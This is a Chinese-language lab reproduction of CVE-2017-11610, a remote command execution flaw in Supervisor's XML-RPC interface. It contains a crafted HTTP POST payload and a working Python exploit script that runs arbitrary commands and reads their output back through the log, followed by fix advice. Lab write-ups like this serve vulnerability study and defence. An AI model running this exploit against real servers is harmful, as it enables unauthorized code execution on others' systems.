**目录**

[Supervisor](#t0)

[漏洞复现](#t1)

[修复建议](#t2)

* * *

Supervisor
----------

Supervisor是使用Python 开发的进程管理程序，一般使用命令行进行管理，当然也能通过web接口图形化管理服务。在配置了web接口后，服务器会启动一个XML RPC服务器，端口为9001，默认配置接口是不需要密码访问的，管理员也可设置为密码访问。利用本漏洞，在获取该接口的访问权限后，远程攻击者可发送一段精心构造的请求，导致在服务器执行任意代码。

影响版本：Supervisor 3.1.2 <= Version <= 3.3.2

### **漏洞复现**

我在本地搭了一个Supervisord的页面，靶机ip：192.168.10.13 ，端口：9001

![](https://img-blog.csdnimg.cn/2019092010444438.png)

![](https://img-blog.csdnimg.cn/20190920172149396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们使用 burpsuite 进行抓包，然后发送到repter，修改数据包如下：

```
POST /RPC2 HTTP/1.1      
Host: 192.168.10.13:9001      
Accept: */*      
Accept-Language: en      
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)      
Connection: close      
Content-Type: application/x-www-form-urlencoded      
Content-Length: 213       1
<?xml version="1.0"?>      1
<methodCall>      1
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>      1
<params>      1
<param>      1
<string>touch /tmp/test.txt </string>      1
</param>      1
</params>      1
</methodCall>
```


通过上面这个poc虽然能验证漏洞，但是执行的命令却没有回显，不能知道是否执行成功了。

于是乎我们可以将命令执行的结果写入 log 文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。

利用代码poc.py如下：

```
import xmlrpc.client      
import sys       
target = sys.argv[1]      
command = sys.argv[2]      
with xmlrpc.client.ServerProxy(target) as proxy:      
    old = getattr(proxy, 'supervisor.readLog')(0,0)      
    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()      
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))      1
    result = getattr(proxy, 'supervisor.readLog')(0,0)      1
    print(result[len(old):])
```


使用方法：

```
python3  poc.py  "http://192.168.10.13:9001/RPC2"  "whoami"
```


由于漏洞环境在容器中是以 nobody 身份运行的，所以权限比较少，不能使用ifconfig等命令。

![](https://img-blog.csdnimg.cn/20190920173127105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果目标机是root身份运行的话，则可以执行所有命令。

 ![](https://img-blog.csdnimg.cn/20190920104013660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **修复建议：**

*   升级Supervisord
*   端口访问控制
*   设置复杂RPC密码

参考文章：[Supervisord 远程命令执行漏洞（CVE-2017-11610）](https://yq.aliyun.com/articles/505597)

相关文章：[Supervisord远程命令执行漏洞（CVE-2017-11610）](https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html)

漏洞复现环境：[Supervisord 远程命令执行漏洞（CVE-2017-11610）](https://vulhub.org/#/environments/supervisor/CVE-2017-11610/)